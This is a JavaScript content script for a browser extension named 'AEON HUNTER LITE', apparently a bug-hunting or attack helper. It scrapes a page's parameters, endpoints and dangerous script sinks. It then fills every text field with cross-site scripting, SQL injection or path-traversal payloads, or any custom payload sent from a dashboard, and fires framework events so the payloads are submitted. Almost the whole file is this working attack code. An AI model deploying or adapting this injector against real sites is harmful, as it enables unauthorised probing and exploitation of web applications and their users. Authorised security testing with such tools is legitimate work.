/**
 * AEON HUNTER LITE (V1.1)
 * Optimized Content Engine - Scraper & Payload Injector
 * Language: English Standard
 */

(function() {
    console.log("%c[AEON LITE] ENGINE_INITIALIZED", "color: #ff0033; font-weight: bold; border: 1px solid #ff0033; padding: 2px 5px;");

    /**
     * 1. CORE COMMUNICATION ROUTER
     * Handles incoming commands from the Dashboard.
     */
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        switch (request.action) {
            case "GET_RECON_DATA":
                sendResponse(performRecon());
                break;
            case "AUTO_INJECT":
                sendResponse(executeInjection(request.payloadType, request.customPayload));
                break;
            default:
                sendResponse({ status: "UNKNOWN_ACTION" });
        }
        return true; 
    });

    /**
     * 2. RECONNAISSANCE ENGINE
     * Rapidly scrapes the DOM for potential entry points and vulnerabilities.
     */
    function performRecon() {
        const discovery = {
            params: new Set(),
            endpoints: new Set(),
            vulnerableSinks: []
        };

        // A. Input & Parameter Discovery
        const selectors = 'input, textarea, select, [name], [id], [data-id], [data-user]';
        document.querySelectorAll(selectors).forEach(el => {
            if (el.name) discovery.params.add(el.name);
            if (el.id) discovery.params.add(el.id);
            // Scrape data attributes (often used in modern frameworks for logic)
            Object.keys(el.dataset).forEach(key => discovery.params.add(`data-${key}`));
        });

        // B. Endpoint Extraction (Regex-based URL discovery)
        const urlPattern = /(?:https?:\/\/|(?:\/api\/v[0-9]))[^\s'"]+/gi;
        const pageSource = document.documentElement.innerHTML;
        const matches = pageSource.match(urlPattern) || [];
        matches.forEach(url => discovery.endpoints.add(url));

        // C. Client-Side Sink Detection
        const dangerPatterns = [
            { pattern: ".innerHTML", type: "DOM_XSS" },
            { pattern: "eval(", type: "CODE_EXEC" },
            { pattern: "setTimeout(", type: "ASYNC_SINK" },
            { pattern: "location.href", type: "REDIRECT_SINK" }
        ];

        Array.from(document.scripts).forEach(script => {
            const content = script.textContent;
            dangerPatterns.forEach(item => {
                if (content.includes(item.pattern)) {
                    discovery.vulnerableSinks.push(`${item.type}: ${item.pattern}`);
                }
            });
        });

        return {
            params: Array.from(discovery.params).slice(0, 50),
            links: Array.from(discovery.endpoints).slice(0, 30),
            sinks: [...new Set(discovery.vulnerableSinks)],
            pageInfo: {
                title: document.title,
                url: window.location.href,
                timestamp: new Date().toISOString()
            }
        };
    }

    /**
     * 3. INJECTION ENGINE
     * Injects payloads into target inputs and forces state updates.
     */
    function executeInjection(type, custom = null) {
        const payloadLibrary = {
            xss: "<script>alert('AEON_HUNT')</script>",
            sqli: "' OR '1'='1' --",
            lfi: "../../../../etc/passwd"
        };

        const activePayload = custom || payloadLibrary[type] || payloadLibrary.xss;
        const targets = document.querySelectorAll('input[type="text"], input[type="search"], textarea, [contenteditable="true"]');
        
        let successCount = 0;
        targets.forEach(input => {
            try {
                // Set the value
                if (input.hasAttribute('contenteditable')) {
                    input.innerText = activePayload;
                } else {
                    input.value = activePayload;
                }

                // Visual Tagging (Lite Style)
                input.style.border = "1px solid #ff0033";
                input.style.backgroundColor = "rgba(255, 0, 51, 0.05)";

                // Force Framework Refresh (Triggers React/Vue/Angular listeners)
                ['input', 'change', 'blur'].forEach(event => {
                    input.dispatchEvent(new Event(event, { bubbles: true }));
                });
                
                successCount++;
            } catch (e) {
                console.warn("[AEON LITE] Injection failed for element:", input);
            }
        });

        console.log(`[AEON LITE] Injection Cycle Finished. Targets: ${successCount}`);
        return { status: "SUCCESS", count: successCount, payload: activePayload };
    }

    /**
     * 4. SPA NAVIGATION MONITOR
     * Keeps the extension synced for Single Page Applications (SPAs).
     */
    let lastKnownUrl = location.href;
    const navObserver = new MutationObserver(() => {
        if (location.href !== lastKnownUrl) {
            lastKnownUrl = location.href;
            chrome.runtime.sendMessage({ 
                type: "SPA_NAVIGATED", 
                url: lastKnownUrl,
                status: "RE-INITIALIZING_ENGINE" 
            });
        }
    });

    navObserver.observe(document, { subtree: true, childList: true });

})();